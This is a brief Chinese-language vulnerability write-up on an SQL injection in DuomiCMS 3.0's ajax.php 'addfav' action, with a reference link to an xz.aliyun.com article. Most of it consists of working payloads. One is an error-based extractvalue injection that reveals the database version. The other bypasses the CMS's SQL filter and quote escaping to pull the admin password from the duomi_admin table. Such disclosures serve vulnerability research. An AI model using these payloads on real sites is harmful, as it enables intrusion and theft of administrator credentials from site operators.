#### 漏洞详情： ####
 payload ：

    ajax.php?action=addfav&id=1&uid=1 and extractvalue(1,concat_ws(0x3A,0x3A,version()))

![](DuomiCMS3.0SQL注入/20180930142726-e62f0396-c479-1.png)

但是要想爆出有用的数据，这里还要绕过 duomiphp/sql.class.php 文件的SQL检测规则以及全局变量的 _RunMagicQuotes 函数的转义。这里直接给出我测试成功的 payload ：
    
    http://localhost//duomiphp/ajax.php?action=addfav&id=1&uid=10101 and `'`.``.vid and extractvalue(1,concat_ws(0x3A,0x3A,(select`password` from`duomi_admin` limit 1))) and `'`.``.vid
![](DuomiCMS3.0SQL注入/20180930142732-e978a926-c479-1.png)

### 参考链接 ###
https://xz.aliyun.com/t/2828#toc-2